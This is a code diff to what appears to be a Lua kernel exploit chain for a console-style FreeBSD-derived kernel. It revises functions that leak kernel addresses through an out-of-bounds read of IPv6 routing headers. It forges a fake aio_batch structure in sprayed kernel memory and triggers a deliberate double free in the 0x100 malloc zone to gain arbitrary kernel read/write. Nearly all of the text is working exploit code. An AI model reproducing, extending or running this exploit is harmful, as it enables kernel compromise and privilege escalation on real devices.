@@ -973,7 +973,7 @@ end
 
 
 
-function leak_kernel_addrs(sd_pair)
+function leak_kernel_addrs(sd_pair, sds)
 
     local sd = sd_pair[1]
     local buflen = 0x80 * LEAK_LEN
@@ -1037,7 +1037,7 @@ function leak_kernel_addrs(sd_pair)
         error("failed to confuse evf and rthdr")
     end
 
-    -- ip6_rthdr and evf structure are overlapped by now
+    -- ip6_rthdr and evf obj are overlapped by now
     -- enlarge ip6_rthdr by writing to its len field by setting the evf's flag
     set_evf_flags(evf, bit32.lshift(0xff, 8))
 
@@ -1060,6 +1060,29 @@ function leak_kernel_addrs(sd_pair)
     local kbuf_addr = memory.read_qword(buf + 0x40) - 0x38
     printf("kernel buffer addr: %s", hex(kbuf_addr))
 
+
+    --
+    -- prep to fake reqs3
+    --
+
+    local wbufsz = 0x80
+    local wbuf = memory.alloc(wbufsz)
+    local rsize = build_rthdr(wbuf, wbufsz)
+    local marker_val = 0xdeadbeef
+    local reqs3_offset = 0x10
+
+    memory.write_dword(wbuf + 4, marker_val)
+    memory.write_dword(wbuf + reqs3_offset + 0, 1)  -- .ar3_num_reqs
+    memory.write_dword(wbuf + reqs3_offset + 4, 0)  -- .ar3_reqs_left
+    memory.write_dword(wbuf + reqs3_offset + 8, AIO_STATE_COMPLETE)  -- .ar3_state
+    memory.write_byte( wbuf + reqs3_offset + 0xc, 0)  -- .ar3_done
+    memory.write_dword(wbuf + reqs3_offset + 0x28, 0x67b0000)  -- .ar3_lock.lock_object.lo_flags
+    memory.write_qword(wbuf + reqs3_offset + 0x38, 1)  -- .ar3_lock.lk_lock = LK_UNLOCKED
+
+    --
+    -- prep to leak reqs2
+    --
+
     -- 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
     -- allocate reqs1 arrays at 0x100 malloc zone
     local num_elems = 6
@@ -1070,44 +1093,77 @@ function leak_kernel_addrs(sd_pair)
     local leak_reqs = make_reqs1(num_elems)
     memory.write_qword(leak_reqs + 0x10, ucred)
 
-    local leak_ids_len = NUM_HANDLES * num_elems
+    local num_loop = NUM_SDS
+    local leak_ids_len = num_loop * num_elems
     local leak_ids = memory.alloc(4 * leak_ids_len)
+    local step = 4 * num_elems
+    local cmd = bit32.bor(AIO_CMD_WRITE, AIO_CMD_FLAG_MULTI)
 
-    local function get_reqs2_offset()
-        for i=1, NUM_LEAKS do
+    local function leak_data()
+
+        -- for i=1, NUM_LEAKS do
+        for i=1, 16 do
+
+            for j=1, num_loop do
+                memory.write_dword(wbuf + 8, j)
+                aio_submit_cmd(cmd, leak_reqs, num_elems, leak_ids + ((j-1) * step))
+                set_rthdr(sds[j], wbuf, rsize)
+            end
             
-            spray_aio(NUM_HANDLES, leak_reqs, num_elems, leak_ids, true, AIO_CMD_WRITE)        
-            
-            -- read out-of-bound for adjacent reqs2
-            get_rthdr(sd, buf, buflen)
+            get_rthdr(sd, buf, buflen) -- out of bound read
+
+            local sd_idx = nil
+            local reqs2_off, fake_reqs3_off = nil, nil
 
             for off=0x80, buflen-1, 0x80 do
-                if verify_reqs2(buf, off) then
-                    printf("found reqs2 at attempt: %d", i)
-                    return off
+
+                if not reqs2_off and verify_reqs2(buf, off) then
+                    reqs2_off = off
                 end
+
+                if not fake_reqs3_off then
+                    local marker = memory.read_dword(buf + off + 4):tonumber()
+                    if marker == marker_val then
+                        fake_reqs3_off = off
+                        sd_idx = memory.read_dword(buf + off + 8):tonumber()
+                    end
+                end
+            end
+
+            if reqs2_off and fake_reqs3_off then
+                printf("found reqs2 and fake reqs3 at attempt: %d", i)
+                local fake_reqs3_sd = sds[sd_idx]
+                table.remove(sds, sd_idx)
+                free_rthdrs(sds)
+                table.insert(sds, new_socket())
+                return reqs2_off, fake_reqs3_off, fake_reqs3_sd
             end
             
             free_aios(leak_ids, leak_ids_len)
         end
-        return nil
     end
 
-    local reqs2_off = get_reqs2_offset()
-    if reqs2_off == nil then
-        error("could not leak a reqs2")
+    local reqs2_off, fake_reqs3_off, fake_reqs3_sd = leak_data()
+    if not reqs2_off and not fake_reqs3_off then
+        error("could not leak reqs2 and fake aio_batch")
     end
 
     dbgf("reqs2 offset: %s", hex(reqs2_off))
+    dbgf("fake reqs3 offset: %s", hex(fake_reqs3_off))
 
     get_rthdr(sd, buf, buflen)
 
     dbg("leaked aio_entry:")
     dbg(memory.hex_dump(buf + reqs2_off, 0x80))
 
+    -- reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
     local reqs1_addr = memory.read_qword(buf + reqs2_off + 0x10)
     reqs1_addr = bit64.band(reqs1_addr, bit64.bnot(0xff))
+
+    local fake_reqs3_addr = kbuf_addr + fake_reqs3_off + reqs3_offset
+
     printf("reqs1_addr = %s", hex(reqs1_addr))
+    printf("fake_reqs3_addr = %s", hex(fake_reqs3_addr))
 
     dbg("searching target_id")
 
@@ -1143,7 +1199,7 @@ function leak_kernel_addrs(sd_pair)
     cancel_aios(to_cancel, to_cancel_len)
     free_aios2(leak_ids, leak_ids_len)
 
-    return reqs1_addr, kbuf_addr, kernel_addr, target_id, evf
+    return reqs1_addr, kbuf_addr, kernel_addr, target_id, evf, fake_reqs3_addr, fake_reqs3_sd
 end
 
 function make_aliased_pktopts(sds)
@@ -1152,12 +1208,12 @@ function make_aliased_pktopts(sds)
 
     for loop = 1, NUM_ALIAS do
 
-        for i=1, NUM_SDS do
+        for i=1, #sds do
             memory.write_dword(tclass, i)
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
         end
 
-        for i=1, NUM_SDS do
+        for i=1, #sds do
             gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
             local marker = memory.read_dword(tclass):tonumber()
             if marker ~= i then
@@ -1177,15 +1233,16 @@ function make_aliased_pktopts(sds)
             end
         end
 
-        for i=1, NUM_SDS do
+        for i=1, #sds do
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)
         end
     end
 
-    error('failed to make aliased pktopts');
+    return nil
 end
 
-function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
+
+function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds, fake_reqs3_addr)
     
     local max_leak_len = bit32.lshift(0xff + 1, 3)
     local buf = memory.alloc(max_leak_len)
@@ -1227,41 +1284,9 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
 
     local rsize = build_rthdr(reqs2, reqs2_size)
 
-    -- .ar2_ticket
-    memory.write_dword(reqs2 + 4, 5)
-
-    -- .ar2_info
-    memory.write_qword(reqs2 + 0x18, reqs1_addr)
-
-    -- craft a aio_batch using the end portion of the buffer
-    local reqs3_offset = 0x28
-
-    -- .ar2_batch
-    memory.write_qword(reqs2 + 0x20, kbuf_addr + reqs3_offset)
-
-    -- [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
-    -- safe since free_queue_entry() doesn't deref the pointer
-    memory.write_dword(reqs2 + reqs3_offset, 1)
-    memory.write_dword(reqs2 + reqs3_offset + 4, 0)
-
-    -- [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
-    memory.write_dword(reqs2 + reqs3_offset + 8, AIO_STATE_COMPLETE)
-
-    memory.write_byte(reqs2 + reqs3_offset + 0xc, 0)
-
-    -- .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
-    -- safe since the entry already got dequeued
-    --
-    -- .ar3_lock.lock_object.lo_flags = (
-    --     LO_SLEEPABLE | LO_UPGRADABLE
-    --     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
-    --     | 6 << LO_CLASSSHIFT  -- Note: JS bitwise shift
-    --     | LO_INITIALIZED
-    -- )
-    memory.write_dword(reqs2 + reqs3_offset + 0x28, 0x67b0000)
-
-    -- .ar3_lock.lk_lock = LK_UNLOCKED
-    memory.write_qword(reqs2 + reqs3_offset + 0x38, 1)
+    memory.write_dword(reqs2 + 4, 5)  -- .ar2_ticket
+    memory.write_qword(reqs2 + 0x18, reqs1_addr)  -- .ar2_info
+    memory.write_qword(reqs2 + 0x20, fake_reqs3_addr)  -- .ar2_batch
 
     local states = memory.alloc(4 * num_elems)
     local addr_cache = {}
@@ -1274,12 +1299,12 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
     syscall.close(sd)
     sd = nil
 
-    local function reclaim_aio_query_with_rthdr()
+    local function overwrite_aio_entry_with_rthdr()
 
         for i=1, NUM_ALIAS do
 
-            for _, each_sd in ipairs(sds) do
-                set_rthdr(each_sd, reqs2, rsize)
+            for j=1,NUM_SDS do
+                set_rthdr(sds[j], reqs2, rsize)
             end
 
             for batch=1, #addr_cache do
@@ -1307,34 +1332,14 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
 
                     local aio_idx = (batch-1) * num_elems + req_idx
                     local req_id_p = aio_ids + aio_idx*4
-                    local req_id = memory.read_dword(req_id_p)
+                    local req_id = memory.read_dword(req_id_p):tonumber()
                     
                     dbgf("req_id = %s", hex(req_id))
 
-                    -- set .ar3_done to 1
                     aio_multi_poll(req_id_p, 1, states)
                     dbgf("states[%d] = %s", req_idx, hex(memory.read_dword(states + req_idx*4)))
                     memory.write_dword(req_id_p, 0)
 
-                    for j=1, NUM_SDS do
-                        local sd2 = sds[j]
-                        get_rthdr(sd2, reqs2, reqs2_size)
-                        local done = memory.read_byte(reqs2 + reqs3_offset + 0xc):tonumber()
-                        if done > 0 then
-                            print(memory.hex_dump(reqs2, reqs2_size))
-                            sd = sd2
-                            table.remove(sds, j)
-                            free_rthdrs(sds)
-                            table.insert(sds, new_socket())
-                            break
-                        end
-                    end
-
-                    if sd == nil then
-                        error("can't find sd that overwrote AIO queue entry")
-                    end
-
-                    dbgf("sd: %d", sd)
                     return req_id
                 end
             end
@@ -1343,7 +1348,7 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
         return nil
     end
 
-    local req_id = reclaim_aio_query_with_rthdr()
+    local req_id = overwrite_aio_entry_with_rthdr()
     if req_id == nil then
         error("failed to overwrite AIO queue entry")
     end
@@ -1365,23 +1370,22 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
     memory.write_dword(target_ids, req_id)
     memory.write_dword(target_ids+4, target_id)
 
+    -- NOTE: we cant use existing `sds` because we dont know which one is reclaimed/dirty
+    local new_sds = {}
+    for i=1,48 do
+        table.insert(new_sds, new_socket())
+    end
+
     -- PANIC: double free on the 0x100 malloc zone. important kernel data may alias
     aio_multi_delete(target_ids, 2, sce_errs)
 
     -- we reclaim first since the sanity checking here is longer which makes it
     -- more likely that we have another process claim the memory
     
-    local sd_pair = nil
-    local err = run_with_coroutine(function()
-        -- RESTORE: double freed memory has been reclaimed with harmless data
-        -- PANIC: 0x100 malloc zone pointers aliased
-        sd_pair = make_aliased_pktopts(sds)
-    end)
+    -- RESTORE: double freed memory has been reclaimed with harmless data
+    -- PANIC: 0x100 malloc zone pointers aliased
+    local sd_pair = make_aliased_pktopts(new_sds)
 
-    if err then
-        print(err)
-    end
-    
     local err1 = memory.read_dword(sce_errs):tonumber()
     local err2 = memory.read_dword(sce_errs+4):tonumber()
     dbgf("delete errors: %s %s", hex(err1), hex(err2))
@@ -1403,8 +1407,12 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
         success = false
     end
 
-    if sd_pair == nil or success == false then
+    if success == false then
         error("ERROR: double free on a 0x100 malloc zone failed")
+    end
+
+    if sd_pair == nil then
+        error('failed to make aliased pktopts');
     end
 
     return sd_pair, sd
@@ -1556,16 +1564,18 @@ function kexploit()
         local sd_pair = double_free_reqs2(sds)
 
         print("\n[+] Leak kernel addresses\n")
-        local reqs1_addr, kbuf_addr, kernel_addr, target_id, evf
-            = leak_kernel_addrs(sd_pair)
+        local reqs1_addr, kbuf_addr, kernel_addr, target_id, evf, fake_reqs3_addr, fake_reqs3_sd
+            = leak_kernel_addrs(sd_pair, sds)
 
         print("\n[+] Double free SceKernelAioRWRequest\n")
         local pktopts_sds, dirty_sd
-            = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[1], sds)
+            = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[1], sds, fake_reqs3_addr)
     
         print('\n[+] Get arbitrary kernel read/write\n');
         make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds)
 
+        -- todo: maybe for cleanup?
+        syscall.close(fake_reqs3_sd)
     end)
 
     if err then
